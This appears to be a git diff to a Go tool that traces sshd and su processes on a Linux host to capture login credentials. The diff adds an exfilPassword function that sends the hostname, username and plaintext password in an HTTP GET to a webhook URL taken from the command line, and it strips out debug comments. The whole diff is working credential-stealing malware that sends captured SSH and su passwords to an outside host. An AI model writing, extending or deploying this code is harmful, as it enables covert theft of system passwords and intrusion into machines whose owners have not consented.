@@ -3,6 +3,8 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"net/http"
+	"net/url"
 	"os"
 	"regexp"
 	"strconv"
@@ -45,13 +47,43 @@ func isSUPid(pid int) bool {
 	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdLine), "\x00", " "))
 }
 
+var webhookURL string
+
+func exfilPassword(username, password string) {
+	hostname, err := os.Hostname()
+	if err != nil {
+		return
+	}
+
+	if webhookURL == "" {
+		fmt.Printf("hostname=%s username=%s password=%s\n", hostname, username, password)
+		return
+	}
+
+	values := url.Values{}
+	values.Set("hostname", hostname)
+	values.Set("username", username)
+	values.Set("password", password)
+	fullURL := fmt.Sprintf("%s?%s", webhookURL, values.Encode())
+
+	if strings.HasPrefix(webhookURL, "https://") {
+		_, _ = http.Get(fullURL)
+	} else if strings.HasPrefix(webhookURL, "http://") {
+		_, _ = http.Get(fullURL)
+	} else {
+		fullURL = fmt.Sprintf("https://%s?%s", webhookURL, values.Encode())
+		_, _ = http.Get(fullURL)
+	}
+}
+
 func main() {
+	if len(os.Args) > 1 {
+		webhookURL = os.Args[1]
+	}
+
 	var processedFirstPID bool
 	var processedPids []int
 	var processedPidsMutex sync.Mutex
-
-	// fmt.Printf("Tracking: SSH, SU\n")
-	// fmt.Println()
 
 	for {
 		pids := findPids()
@@ -62,7 +94,6 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					// fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
 					processedPids = append(processedPids, pid)
 				}
@@ -72,7 +103,6 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
-					// fmt.Println("SU process found with PID:", pid)
 					go traceSUProcess(pid)
 					processedPids = append(processedPids, pid)
 				}
